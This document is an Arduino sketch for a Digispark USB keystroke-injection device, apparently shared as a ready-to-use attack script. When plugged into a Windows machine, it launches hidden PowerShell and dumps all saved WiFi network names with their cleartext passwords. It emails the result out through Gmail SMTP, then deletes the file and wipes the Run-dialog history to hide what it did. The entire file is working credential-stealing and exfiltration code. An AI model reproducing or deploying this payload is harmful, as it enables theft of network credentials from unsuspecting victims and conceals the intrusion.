/********************************************************************************
  Gather WiFi data and email it,  !!!NEED ADMIN PRIVILEGES!!! 
  Change line 19 and 32 ('Desktop') to location you want file saved
  Change line 32 'GMAIL_USERNAME'<-username ONLY, ;GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
  Change line 43 to set location file was saved
  CREDIT: C4PT14ND34DP00L
*******************************************************************************/

#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$DesktopPath = [Environment]::GetFolderPath('Desktop'); cd $DesktopPath; (netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv WiFi.csv"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  //Email file
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass $DesktopPath = [Environment]::GetFolderPath('Desktop'); cd $DesktopPath; $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('GMAIL_USERNAME', 'GMAIL_PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'SENDER_EMAIL'; $ReportEmail.To.Add('RECEIVER_EMAIL'); $ReportEmail.Subject = 'DigiDuck Report'; $ReportEmail.Body = 'Attached is your report from ' + $env:computername + '. - Regards Your Digispark'; $ReportEmail.Attachments.Add($DesktopPath + '\\WiFi.csv'); $SMTPInfo.Send($ReportEmail)"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  //Change to file location
  DigiKeyboard.print("cd %UserProfile%\\Desktop");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  //Delete file
  DigiKeyboard.print(F("del WiFi.csv"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
  //Light up the onboard LED when the script is done
  int ledPin = 1;
  digitalWrite(ledPin, HIGH);
  for (;;) {
    /*empty*/
  }
}

void loop() {
}
